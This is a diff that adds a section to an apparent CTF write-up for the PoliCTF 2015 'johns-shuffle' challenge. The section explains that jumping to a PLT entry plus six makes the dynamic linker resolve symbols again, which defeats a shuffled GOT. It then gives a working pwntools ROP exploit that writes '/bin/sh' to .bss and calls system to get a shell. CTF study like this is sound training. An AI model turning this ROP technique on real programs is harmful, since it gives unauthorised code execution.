@@ -230,7 +230,46 @@ while True:
     except:
         pass
 ```
+
+## Yet another solution
+The first solution unshuffles the got.plt and the second is a probabilistic attack relying on 2 got.plt entries(read and system) being untouched. Both these exploits are trying to deal with the shuffling, but a much simpler solution can be achieved by remebering what a plt entry looks like:
+
+```
+08048690 <read@plt>:
+ 8048690:       ff 25 0c b0 04 08       jmp    *0x804b00c            Jump to the address from the got.plt
+ 8048696:       68 00 00 00 00          push   $0x0                  First time? Call the dynamic linker
+ 804869b:       e9 e0 ff ff ff          jmp    8048680 <_init+0x2c>  
+```
+
+So the dynamic linker will lookup the symbol again if we call `read@plt + 6` and thus bypass the got.plt entirely.
+
+## Exploit code
+```python
+#!/usr/bin/python2
+# https://gist.github.com/kokjo/06ef3424ce19815240e3
+from pwn import *
+
+e = ELF("./johns-shuffle")
+rop = ROP(e)
+
+command = "/bin/sh"
+
+# Bypass the shuffling by forcing the dynamic linker to lookup the symbols again
+rop.call(e.plt["read"]+6, [0, e.bss(), len(command)+1])
+rop.call(e.plt["system"]+6, [e.bss()])
+
+r = process("./johns-shuffle")
+#r = remote('shuffle.polictf.it',80)
+r.sendlineafter("mistake..\n", "exit"+ "A"*28 + str(rop))
+r.sendafter("\n", command+"\x00")
+
+# ... and we have shell!
+r.interactive()
+```
+
+
 ## Other write-ups and resources
 
 * <https://ctf-team.vulnhub.com/polictf-2015-johns-shuffle/>
 * <https://github.com/thebarbershopper/ctf-writeups/tree/master/polictf-2015/johns-shuffle>
+
